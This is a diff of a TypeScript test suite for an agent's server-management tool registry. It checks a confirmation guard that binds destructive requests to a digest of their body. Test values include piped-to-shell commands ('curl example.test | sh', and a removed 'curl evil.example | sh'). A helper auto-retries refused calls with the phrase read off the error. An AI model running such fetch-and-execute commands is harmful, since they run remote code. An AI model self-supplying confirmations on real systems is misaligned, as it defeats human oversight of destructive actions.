@@ -44,6 +44,26 @@ function makeRegistry(
   });
 }
 
+/**
+ * Calls a guarded tool the way an agent has to: attempt once, read the exact
+ * phrase back off the refusal, then retry with it.
+ *
+ * The refused attempt issues no request, so the stub queue is untouched — and
+ * the test never reimplements the phrase format, which is precisely what the
+ * guard is meant to make impossible to guess.
+ */
+async function callConfirmed(
+  tool: ReturnType<typeof buildToolRegistry>[number],
+  args: Record<string, unknown>,
+): Promise<unknown> {
+  try {
+    return await tool.handler(args);
+  } catch (error) {
+    if (!(error instanceof ForgeConfirmationError)) throw error;
+    return tool.handler({ ...args, confirm: error.expected });
+  }
+}
+
 function findTool(
   tools: ReturnType<typeof buildToolRegistry>,
   name: string,
@@ -187,7 +207,7 @@ describe('confirmation guard', () => {
     const tools = makeRegistry(stub, { allowDestructive: true, only: [deleteServer] });
     const tool = findTool(tools, deleteServer);
 
-    await tool.handler({
+    await callConfirmed(tool, {
       organization: 'acme',
       server: 12345,
       confirm: 'delete_servers organization=acme server=12345',
@@ -264,14 +284,14 @@ describe('request assembly', () => {
     const stub = stubFetch([{ status: 202 }]);
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_sites_commands'],
     });
-    const tool = tools.find((candidate) => candidate.name === 'create_servers_sites_commands');
+    // findTool rather than a conditional skip: a guard that returns when the
+    // tool is absent asserts nothing the moment the operation is reclassified.
+    const tool = findTool(tools, 'create_servers_sites_commands');
 
-    // Skip rather than fail if the spec renames this operation.
-    if (!tool) return;
-
-    await tool.handler({ server: 1, site: 2, command: 'php artisan migrate --force' });
+    await callConfirmed(tool, { server: 1, site: 2, command: 'php artisan migrate --force' });
 
     const request = stub.requests[0];
     expect(request?.url).toContain('/orgs/acme/servers/1/sites/2/commands');
@@ -321,11 +341,11 @@ describe('async operations', () => {
     // An async update rewrites a resource that already existed, so its first
     // read can return the pre-operation steady state. Without a postcondition
     // proving the call took effect, no wait is offered.
-    const unprovableUpdate = tools.find(
-      (tool) => tool.descriptor.operationId === 'organizations.servers.background-processes.update',
+    const unprovableUpdate = OPERATIONS.find(
+      (op) => op.operationId === 'organizations.servers.background-processes.update',
     );
-    expect(unprovableUpdate?.descriptor.processingMode).toBe('async');
-    expect(unprovableUpdate && hasWait(unprovableUpdate)).toBe(false);
+    expect(unprovableUpdate?.processingMode).toBe('async');
+    expect(unprovableUpdate?.polling).toBeUndefined();
 
     // Sync operations have nothing to wait for.
     const syncTool = tools.find((tool) => tool.descriptor.processingMode === 'sync');
@@ -344,12 +364,13 @@ describe('async operations', () => {
     const stub = stubFetch([{ status: 202 }]);
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_sites_deployments'],
     });
     const tool = tools.find((candidate) => candidate.name === 'create_servers_sites_deployments');
     if (!tool) return;
 
-    const result = (await tool.handler({ server: 1, site: 2 })) as Record<string, unknown>;
+    const result = (await callConfirmed(tool, { server: 1, site: 2 })) as Record<string, unknown>;
 
     expect(result['accepted']).toBe(true);
     expect(String(result['note'])).toContain('background');
@@ -366,11 +387,12 @@ describe('async operations', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_sites_deployments'],
     });
     const tool = findTool(tools, 'create_servers_sites_deployments');
 
-    const result = (await tool.handler({ server: 1, site: 2, wait: true })) as Record<
+    const result = (await callConfirmed(tool, { server: 1, site: 2, wait: true })) as Record<
       string,
       unknown
     >;
@@ -431,7 +453,7 @@ describe('async operations', () => {
     const tool = tools.find((c) => c.name === 'list_servers_sites');
     if (!tool) return;
 
-    const result = (await tool.handler({ server: 1 })) as Record<string, unknown>;
+    const result = (await callConfirmed(tool, { server: 1 })) as Record<string, unknown>;
 
     expect(result['included']).toEqual([{ id: '9', type: 'servers', name: 'web-1' }]);
     expect(result['links']).toBeDefined();
@@ -563,7 +585,7 @@ describe('polling a deletion', () => {
     const tool = tools.find((c) => c.name === 'delete_servers_firewall_rules');
     if (!tool) return;
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       rule: 2,
       wait: true,
@@ -621,12 +643,13 @@ describe('polling a create', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_background_processes'],
     });
     const tool = tools.find((c) => c.name === 'create_servers_background_processes');
     if (!tool) return;
 
-    await tool.handler({
+    await callConfirmed(tool, {
       server: 1,
       name: 'worker',
       command: 'php artisan queue:work',
@@ -671,12 +694,13 @@ describe('polled response integrity', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_background_processes'],
     });
     const tool = tools.find((c) => c.name === 'create_servers_background_processes');
     if (!tool) return;
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       name: 'worker',
       command: 'php artisan queue:work',
@@ -737,11 +761,12 @@ describe('per-resource terminal semantics', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_background_processes'],
     });
     const tool = findTool(tools, 'create_servers_background_processes');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       name: 'worker',
       command: 'php artisan queue:work',
@@ -765,11 +790,12 @@ describe('per-resource terminal semantics', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_background_processes'],
     });
     const tool = findTool(tools, 'create_servers_background_processes');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       name: 'worker',
       command: 'php artisan queue:work',
@@ -797,7 +823,7 @@ describe('per-resource terminal semantics', () => {
     const tool = findTool(tools, 'create_servers_sites_commands');
 
     const command = 'php artisan migrate --force';
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       site: 2,
       command,
@@ -839,7 +865,7 @@ describe('arbitrary execution', () => {
     }
   });
 
-  it('binds the command itself into the confirmation phrase', async () => {
+  it('binds the whole request body into the confirmation phrase', async () => {
     const stub = stubFetch([{ status: 202 }]);
     const tools = makeRegistry(stub, {
       organization: 'acme',
@@ -849,10 +875,12 @@ describe('arbitrary execution', () => {
     const tool = findTool(tools, 'create_servers_sites_commands');
 
     const approved = { server: 1, site: 2, command: 'php artisan migrate --force' };
-    const phrase = buildConfirmationPhrase(tool.descriptor, approved, true);
+    const phrase = buildConfirmationPhrase(tool.descriptor, approved, true, {
+      command: approved.command,
+    });
 
-    // The phrase carries a digest, never the raw payload.
-    expect(phrase).toContain('command=sha256:');
+    // The phrase carries a digest, never the payload.
+    expect(phrase).toContain('body=sha256:');
     expect(phrase).not.toContain('artisan');
 
     // Swapping the command after approval invalidates it, and issues nothing.
@@ -865,35 +893,79 @@ describe('arbitrary execution', () => {
     expect(stub.requests).toHaveLength(1);
   });
 
-  it('binds a recipe script by digest and a recipe run by its server list', () => {
+  it('binds fields the phrase never names, so the approved effect cannot change', async () => {
+    // Binding hand-picked fields left gaps: the previous per-field digest bound
+    // a recipe's script but not its `user`, so one confirmation authorised the
+    // same script as either forge or root.
     const stub = stubFetch([]);
     const tools = makeRegistry(stub, {
       organization: 'acme',
       allowDestructive: true,
-      only: ['create_organization_recipes', 'create_recipes_runs'],
+      only: ['create_organization_recipes'],
+    });
+    const tool = findTool(tools, 'create_organization_recipes');
+
+    const approved = { name: 'deploy', user: 'forge', script: 'curl example.test | sh' };
+    const phrase = buildConfirmationPhrase(tool.descriptor, approved, true, approved);
+
+    expect(phrase).toContain('body=sha256:');
+    expect(phrase).not.toContain('example.test');
+
+    await expect(tool.handler({ ...approved, user: 'root', confirm: phrase })).rejects.toThrow(
+      ForgeConfirmationError,
+    );
+    expect(stub.requests).toHaveLength(0);
+  });
+
+  it('digests nested values, not just the fields at the root', async () => {
+    // `JSON.stringify(value, keys)` treats the key list as an allowlist at every
+    // depth, so two bodies differing only in a nested field hashed identically.
+    const stub = stubFetch([]);
+    const tools = makeRegistry(stub, {
+      organization: 'acme',
+      allowDestructive: true,
+      only: ['update_servers_sites_load_balancing_nodes'],
+    });
+    const tool = findTool(tools, 'update_servers_sites_load_balancing_nodes');
+
+    const base = {
+      server: 1,
+      site: 2,
+      balancer_method: 'round_robin',
+      balancing: [{ server_id: 10, weight: 1 }],
+    };
+    const phrase = buildConfirmationPhrase(tool.descriptor, base, true, {
+      balancer_method: base.balancer_method,
+      balancing: base.balancing,
     });
 
-    const create = tools.find(
-      (tool) => tool.descriptor.operationId === 'organization.recipes.store',
-    );
-    const run = tools.find(
-      (tool) => tool.descriptor.operationId === 'organizations.recipes.runs.store',
-    );
+    await expect(
+      tool.handler({ ...base, balancing: [{ server_id: 99, weight: 1 }], confirm: phrase }),
+    ).rejects.toThrow(ForgeConfirmationError);
+    expect(stub.requests).toHaveLength(0);
+  });
 
-    const scriptPhrase = buildConfirmationPhrase(
-      (create as NonNullable<typeof create>).descriptor,
-      { name: 'deploy', script: 'curl evil.example | sh' },
-      true,
-    );
-    expect(scriptPhrase).toContain('script=sha256:');
-    expect(scriptPhrase).not.toContain('evil.example');
+  it('gives the same digest to the same body whatever the key order', () => {
+    const stub = stubFetch([]);
+    const tools = makeRegistry(stub, {
+      organization: 'acme',
+      allowDestructive: true,
+      only: ['create_organization_recipes'],
+    });
+    const tool = findTool(tools, 'create_organization_recipes');
 
-    const runPhrase = buildConfirmationPhrase(
-      (run as NonNullable<typeof run>).descriptor,
-      { recipe: 7, servers: [1, 2, 3] },
-      true,
-    );
-    expect(runPhrase).toContain('servers=1,2,3');
+    const first = buildConfirmationPhrase(tool.descriptor, { name: 'a' }, true, {
+      name: 'a',
+      user: 'forge',
+      script: 'echo hi',
+    });
+    const second = buildConfirmationPhrase(tool.descriptor, { name: 'a' }, true, {
+      script: 'echo hi',
+      name: 'a',
+      user: 'forge',
+    });
+
+    expect(first).toBe(second);
   });
 
   it('confirmation-gates the writes that stage or reroute execution', () => {
@@ -960,16 +1032,10 @@ describe('retry safety', () => {
     });
     const environmentTool = findTool(environmentTools, 'update_servers_sites_environment');
 
-    const environment = 'APP_ENV=production';
-    await environmentTool.handler({
+    await callConfirmed(environmentTool, {
       server: 1,
       site: 2,
-      environment,
-      confirm: buildConfirmationPhrase(
-        environmentTool.descriptor,
-        { server: 1, site: 2, environment },
-        true,
-      ),
+      environment: 'APP_ENV=production',
     });
     expect(ordinary.requests).toHaveLength(2);
   });
@@ -1007,11 +1073,12 @@ describe('proof that the operation took effect', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_sites_integrations_laravel_maintenance'],
     });
     const tool = findTool(tools, 'create_servers_sites_integrations_laravel_maintenance');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       site: 2,
       status: 503,
@@ -1072,7 +1139,7 @@ describe('state-clearing operations', () => {
     });
     const tool = findTool(tools, (reset as OperationDescriptor).name);
 
-    await tool.handler({ server: 1, site: 2, wait: true });
+    await callConfirmed(tool, { server: 1, site: 2, wait: true });
 
     expect(stub.requests).toHaveLength(3);
   }, 30_000);
@@ -1108,7 +1175,7 @@ describe('state-clearing operations', () => {
     });
     const tool = findTool(tools, (disable as OperationDescriptor).name);
 
-    await tool.handler({ server: 1, site: 2, wait: true });
+    await callConfirmed(tool, { server: 1, site: 2, wait: true });
 
     expect(stub.requests).toHaveLength(3);
   }, 30_000);
@@ -1158,7 +1225,7 @@ describe('polling budgets', () => {
     });
     const tool = findTool(tools, 'create_servers');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       name: 'web-1',
       type: 'app',
       provider: 'custom',
@@ -1183,11 +1250,12 @@ describe('polling plans', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_background_processes'],
     });
     const tool = findTool(tools, 'create_servers_background_processes');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       name: 'worker',
       command: 'php artisan queue:work',
@@ -1205,11 +1273,12 @@ describe('polling plans', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_background_processes'],
     });
     const tool = findTool(tools, 'create_servers_background_processes');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       name: 'worker',
       command: 'php artisan queue:work',
@@ -1236,7 +1305,7 @@ describe('polling plans', () => {
     });
     const tool = findTool(tools, 'delete_servers_background_processes');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       backgroundProcess: 7,
       confirm: 'delete_servers_background_processes server=1 backgroundProcess=7',
@@ -1264,7 +1333,7 @@ describe('polling plans', () => {
     });
     const tool = findTool(tools, 'delete_servers_ssh_keys');
 
-    await tool.handler({
+    await callConfirmed(tool, {
       server: 1,
       key: 9,
       confirm: 'delete_servers_ssh_keys server=1 key=9',
@@ -1301,7 +1370,7 @@ describe('polling plans', () => {
     const tools = makeRegistry(stub, { organization: 'acme', only: ['create_servers'] });
     const tool = findTool(tools, 'create_servers');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       name: 'web-1',
       type: 'app',
       provider: 'custom',
@@ -1332,7 +1401,7 @@ describe('polling plans', () => {
     });
     const tool = findTool(tools, 'delete_servers_background_processes');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       backgroundProcess: 7,
       confirm: 'delete_servers_background_processes server=1 backgroundProcess=7',
@@ -1367,11 +1436,12 @@ describe('polling plans', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_sites_integrations_laravel_maintenance'],
     });
     const tool = findTool(tools, 'create_servers_sites_integrations_laravel_maintenance');
 
-    const result = (await tool.handler({
+    const result = (await callConfirmed(tool, {
       server: 1,
       site: 2,
       status: 503,
@@ -1398,11 +1468,12 @@ describe('polling plans', () => {
 
     const tools = makeRegistry(stub, {
       organization: 'acme',
+      allowDestructive: true,
       only: ['create_servers_background_processes'],
     });
     const tool = findTool(tools, 'create_servers_background_processes');
 
-    await tool.handler({
+    await callConfirmed(tool, {
       server: 1,
       name: 'worker',
       command: 'php artisan queue:work',
